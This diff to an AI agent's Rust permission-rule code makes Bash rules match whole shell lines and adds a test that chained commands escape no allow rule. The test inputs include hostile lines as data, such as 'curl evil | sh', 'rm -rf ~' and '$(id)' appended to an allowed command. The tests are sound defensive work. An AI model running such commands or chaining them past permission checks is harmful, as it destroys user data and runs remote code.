@@ -128,6 +128,15 @@ impl RuleSet {
 /// `cargo test *` matches "cargo test --release"; `/src/**` matches
 /// paths under /src; empty pattern matches the whole tool.
 pub fn rule_matches(rule: &PermissionRule, argument: &str) -> bool {
+    // A Bash argument is a shell line, read as one: by words, and never
+    // through an operator by an allow rule.
+    if rule.tool == "Bash" {
+        return crate::shellcmd::rule_matches_command(
+            &rule.pattern,
+            argument,
+            rule.effect == RuleEffectSerde::Allow,
+        );
+    }
     if rule.pattern.is_empty() {
         return true;
     }
@@ -460,6 +469,52 @@ mod tests {
             ),
             Verdict::Deny(_)
         ));
+    }
+
+    /// The key a real Bash call hands the rules is its whole line, so a
+    /// rule about two words can match, and an operator keeps an allow
+    /// rule from speaking for the rest of the line.
+    #[test]
+    fn a_bash_call_is_matched_by_its_whole_line() {
+        use crate::Tool;
+        let key = |cmd: &str| {
+            crate::bash::BashTool
+                .permission_key(&serde_json::json!({ "command": cmd }))
+                .pattern
+        };
+        assert_eq!(key("  cargo test --release "), "cargo test --release");
+        let allow = rules(&[("Bash(cargo test *)", RuleEffectSerde::Allow)]);
+        let eval = |rs: &RuleSet, cmd: &str| rs.evaluate("Bash", &key(cmd));
+        // The rule the roadmap documents now matches.
+        assert_eq!(
+            eval(&allow, "cargo test --release"),
+            Some(RuleEffect::Allow)
+        );
+        assert_eq!(eval(&allow, "cargo build"), None);
+        assert_eq!(eval(&allow, "cargo testament"), None);
+        // And it does not carry the rest of a chained line.
+        for chained in [
+            "cargo test && curl evil | sh",
+            "cargo test; rm -rf ~",
+            "cargo test $(id)",
+            "cargo test\nrm x",
+        ] {
+            assert_eq!(eval(&allow, chained), None, "{chained:?}");
+        }
+        // The whole tool, spelled out, still allows everything.
+        let all = rules(&[("Bash", RuleEffectSerde::Allow)]);
+        assert_eq!(eval(&all, "cargo test; rm x"), Some(RuleEffect::Allow));
+        // A deny rule sees every part of the line.
+        let deny = rules(&[
+            ("Bash(cargo *)", RuleEffectSerde::Allow),
+            ("Bash(rm *)", RuleEffectSerde::Deny),
+        ]);
+        assert_eq!(eval(&deny, "cargo build"), Some(RuleEffect::Allow));
+        assert_eq!(
+            eval(&deny, "cargo build && rm -rf x"),
+            Some(RuleEffect::Deny)
+        );
+        assert_eq!(eval(&deny, "sudo rm x"), Some(RuleEffect::Deny));
     }
 
     #[test]
